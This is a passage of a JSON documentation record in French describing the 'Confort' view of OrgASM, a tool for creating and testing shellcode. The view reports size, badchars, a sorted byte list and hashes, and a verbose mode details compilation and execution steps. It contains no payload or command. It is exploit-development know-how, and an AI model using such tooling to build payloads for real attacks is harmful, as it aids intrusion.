am\u00e9liorer le confort lors de la cr\u00e9ation, de l'utilisation et du test de shellcode, OrgASM propose une vue d\u00e9taill\u00e9e reprenant un certain nombre d'informations pouvant s'av\u00e9rer \u00eatre utiles, telles que : La taille du shellcode Les badchars potentiellement pr\u00e9sents La liste class\u00e9e par ordre alphab\u00e9tique des octets qui le composent, sans doublons Les hashs MD5, SHA1 et SHA256 Lorsque l'option verbose est activ\u00e9e, le programme d\u00e9taille les processus de compilation et d'ex\u00e9cution pour permettre de les reproduire dans un autre contexte.","title":"Confort"}]}